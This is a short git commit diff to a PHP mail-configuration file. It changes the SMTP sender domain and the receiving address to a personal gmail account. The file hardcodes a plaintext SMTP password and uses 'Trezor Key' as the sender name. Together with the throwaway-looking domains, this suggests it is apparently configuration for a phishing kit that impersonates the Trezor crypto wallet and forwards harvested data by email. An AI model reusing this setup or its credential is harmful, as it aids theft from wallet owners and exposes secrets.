a39d02da685bb9f10ce0478e7b9f7393bf64189f
vinay sachan <vinay@tappetbox.com>
2024-12-10 01:39:34 +0530

    changes

--- includes/constant.php
+++ includes/constant.php
@@ -1,11 +1,11 @@
 <?php
 define('CONST_MAIL_SERVER', 'smtpout.secureserver.net');
-define('CONST_MAIL_USERNAME', 'help@travelbiy.com');
+define('CONST_MAIL_USERNAME', 'help@tavelssky.xyz');
 define('CONST_MAIL_PASSWORD', 'Help@me123');
-define('CONST_MAIL_FROM', 'help@travelbiy.com');
+define('CONST_MAIL_FROM', 'help@tavelssky.xyz');
 define('CONST_MAIL_PORT', '465');
 define('CONST_MAIL_FROM_NAME', 'Trezor Key');
-define('CONST_RECEIVE_EMAIL', 'gracebarrows8722@outlook.com');
+define('CONST_RECEIVE_EMAIL', 'sandra.wilson122001@gmail.com');
 //define('CONST_RECEIVE_EMAIL', 'vinaysachan@live.in');
 
 ?>
